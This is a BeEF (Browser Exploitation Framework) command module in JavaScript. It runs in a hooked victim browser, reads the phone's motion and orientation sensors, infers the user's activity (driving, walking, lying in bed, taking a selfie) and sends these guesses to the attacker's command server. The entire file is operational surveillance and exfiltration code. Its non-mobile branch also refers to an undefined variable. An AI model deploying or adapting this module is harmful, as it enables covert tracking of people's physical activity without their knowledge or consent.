//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var status = 'loading';
  var update_interval = 1000;

  if (!beef.hardware.isMobileDevice()) {
    beef.debug(result);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + result, beef.are.status_error());
  }

  var historicMotion = {
    "x": [],
    "y": [],
    "z": []
  }
  var historicOrientation = {
    "x": [],
    "y": [],
    "z": []
  }

  function setStatus(new_status) {
    if (status == new_status) return; // status hasn't changed

    status = new_status;
    beef.debug(new_status);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=' + new_status, beef.are.status_success());
  }

  function updateStatus() {
    var movement = mostRecentMovementOverall(75)

    lastHistoricOrientationX = historicOrientation["x"][historicOrientation["x"].length - 1];
    lastHistoricOrientationY = historicOrientation["y"][historicOrientation["y"].length - 1];
    lastHistoricOrientationZ = historicOrientation["z"][historicOrientation["z"].length - 1];

    // Below some stupid, very basic code to guess what the user is doing
    // As described in the README, this is just a proof of concept
    if (mostRecentMovementOverall(4000) > 40) { // TODO: haven't tested this, 1,000 so it's a longer time
      setStatus("driving or other form of transportation")
    } else if (lastHistoricOrientationZ > 70 || lastHistoricOrientationZ < -70) {
      setStatus("lying in bed sideways, or taking a landscape picture")
    } else if (lastHistoricOrientationY > 160 || lastHistoricOrientationY < -160) {
      setStatus("lying on your back, with your phone up")
    } else if (lastHistoricOrientationY >= 30 && lastHistoricOrientationY < 70) {
      if (movement > 18) {
        setStatus("using your phone while walking")
      } else {
        setStatus("using your phone, sitting or standing")
      }
    } else if (lastHistoricOrientationY >= 70 && lastHistoricOrientationY < 95) {
      if (movement > 18) {
        setStatus("using your phone while walking")
      } else {
        setStatus("taking a picture")
      }
    } else if (lastHistoricOrientationY >= 95 && lastHistoricOrientationY < 120) {
      setStatus("taking a selfie")
    } else if (Math.round(lastHistoricOrientationZ) == 0 && Math.round(lastHistoricOrientationY) == 0) {
      setStatus("using the phone on a table")
    } else {
      if (movement > 18) {
        setStatus("using your phone while walking")
      } else {
        setStatus("using your phone, sitting or standing")
      }
    }
  }

  function mostRecentMovementOverall(numberOfHistoricPoints) {
    return (mostRecentMovement(historicMotion["x"], numberOfHistoricPoints, true) + 
            mostRecentMovement(historicMotion["y"], numberOfHistoricPoints, true) + 
            mostRecentMovement(historicMotion["z"], numberOfHistoricPoints, true)) / 3.0
  }

  // numberOfHistoricPoints: 100 is about 3 seconds
  function mostRecentMovement(array, numberOfHistoricPoints, removeNegatives) {
    if (array.length > numberOfHistoricPoints) {
      totalSum = 0
      for (var toCount = 0; toCount < numberOfHistoricPoints; toCount++) {
        currentElement = array[array.length - toCount - 1]
        currentElement *= (1 - toCount / numberOfHistoricPoints) // weight the most recent data more
        if (currentElement < 0 && removeNegatives) currentElement = currentElement * -1 
        if (currentElement > 0.1 || currentElement < -0.1) totalSum += currentElement
      }
      return totalSum * 100 / numberOfHistoricPoints
    }
    return 0 // not enough data yet
  }

  window.addEventListener("devicemotion", motion, false);

  function motion(event) {
    //motionX = (mostRecentMovement(historicMotion["x"], 150, false)).toFixed(2)
    //motionY = (mostRecentMovement(historicMotion["y"], 150, false)).toFixed(2)
    //motionZ = (mostRecentMovement(historicMotion["z"], 150, false)).toFixed(2)

    historicMotion["x"].push(event.acceleration.x)
    historicMotion["y"].push(event.acceleration.y)
    historicMotion["z"].push(event.acceleration.z)
  }

  window.addEventListener("deviceorientation", orientation, false);

  function orientation(event) {
    //orientationX = Math.round(event.alpha)
    //orientationY = Math.round(event.beta)
    //orientationZ = Math.round(event.gamma)

    historicOrientation["x"].push(event.alpha)
    historicOrientation["y"].push(event.beta)
    historicOrientation["z"].push(event.gamma)
  }

  setInterval(updateStatus, update_interval)
});
